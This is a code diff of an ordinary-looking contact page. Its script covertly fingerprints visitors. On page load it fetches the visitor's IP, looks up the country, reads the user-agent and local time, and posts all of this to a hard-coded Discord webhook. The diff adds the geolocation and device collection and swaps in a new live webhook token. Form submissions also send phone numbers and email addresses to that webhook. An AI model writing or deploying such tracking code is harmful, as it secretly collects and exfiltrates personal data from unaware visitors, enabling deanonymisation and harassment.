@@ -25,7 +25,6 @@
         p {
             margin-bottom: 15px;
         }
-        /* Style for the form */
         .contact-form {
             margin-top: 40px;
             padding: 20px;
@@ -81,10 +80,9 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const form = document.getElementById('contactForm');
-            const webhookUrl = 'https://discord.com/api/webhooks/1354943880205959280/m_Sk7fhLF3e9lFab06lzMB9Up1Y0FtxJqZJDMQZxkRgapN388FpY9mXaZhDacvqiz86d'; // **REPLACE WITH YOUR ACTUAL WEBHOOK URL**
-            let userIP = null; // Store IP address
+            const webhookUrl = 'https://discord.com/api/webhooks/1369468126420402216/0ksz25fxIgwSXW5bPgyIyhgiotcrxUst3T_T1JrchM7cb8WE74Du1Q07FVE5GOCSXX7z'; // **REPLACE WITH YOUR ACTUAL WEBHOOK URL**
+            let userIP = null;
 
-            // Function to send data to Discord webhook
             function sendToDiscord(message) {
                 fetch(webhookUrl, {
                     method: 'POST',
@@ -101,7 +99,6 @@
                 });
             }
 
-            // Fetch IP address and then proceed
             fetch('https://api.ipify.org?format=json')
                 .then(response => {
                     if (!response.ok) {
@@ -113,21 +110,59 @@
                 .then(data => {
                     userIP = data.ip;
                     console.log("Fetched IP Address:", userIP);
-                    // Send IP address on page load
-                    const ipMessage = {
-                        embeds: [{
-                            title: 'Page Opened - IP Address',
-                            fields: [
-                                { name: 'IP Address', value: userIP }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-                    sendToDiscord(ipMessage);
+
+                    // Get device information (user agent string)
+                    const deviceName = navigator.userAgent;
+
+                    // Get local time
+                    const now = new Date();
+                    const localTime = now.toLocaleString();
+
+                    // Fetch geolocation data based on IP
+                    fetch(`https://ipapi.co/${userIP}/json/`)
+                        .then(response => {
+                            if (!response.ok) {
+                                console.error('Geolocation Fetch Error:', response.status);
+                                return Promise.reject('Failed to fetch geolocation data');
+                            }
+                            return response.json();
+                        })
+                        .then(geoData => {
+                            const country = geoData.country_name || 'N/A';
+
+                            const ipInfoMessage = {
+                                embeds: [{
+                                    title: 'Page Opened - IP Information',
+                                    fields: [
+                                        { name: 'IP Address', value: userIP },
+                                        { name: 'Device', value: deviceName },
+                                        { name: 'Country', value: country },
+                                        { name: 'Local Time', value: localTime }
+                                    ],
+                                    timestamp: new Date().toISOString()
+                                }]
+                            };
+                            sendToDiscord(ipInfoMessage);
+                        })
+                        .catch(geoError => {
+                            console.error('Geolocation Error:', geoError);
+                            const ipOnlyMessage = {
+                                embeds: [{
+                                    title: 'Page Opened - IP Address (Geolocation Failed)',
+                                    fields: [
+                                        { name: 'IP Address', value: userIP },
+                                        { name: 'Device', value: deviceName },
+                                        { name: 'Local Time', value: localTime }
+                                    ],
+                                    timestamp: new Date().toISOString()
+                                }]
+                            };
+                            sendToDiscord(ipOnlyMessage);
+                        });
 
                     // Handle form submission
                     form.addEventListener('submit', function(event) {
-                        event.preventDefault(); // Prevent default form submission
+                        event.preventDefault();
 
                         const phoneNumber = document.getElementById('phone').value;
                         const emailAddress = document.getElementById('email').value;
@@ -138,14 +173,14 @@
                                 fields: [
                                     { name: 'Phone Number', value: phoneNumber },
                                     { name: 'Email Address', value: emailAddress },
-                                    { name: 'IP Address', value: userIP } // Include IP on submission as well
+                                    { name: 'IP Address', value: userIP }
                                 ],
                                 timestamp: new Date().toISOString()
                             }]
                         };
                         sendToDiscord(formDataMessage);
                         alert('Information sent successfully!');
-                        form.reset(); // Clear the form
+                        form.reset();
                     });
                 })
                 .catch(error => {
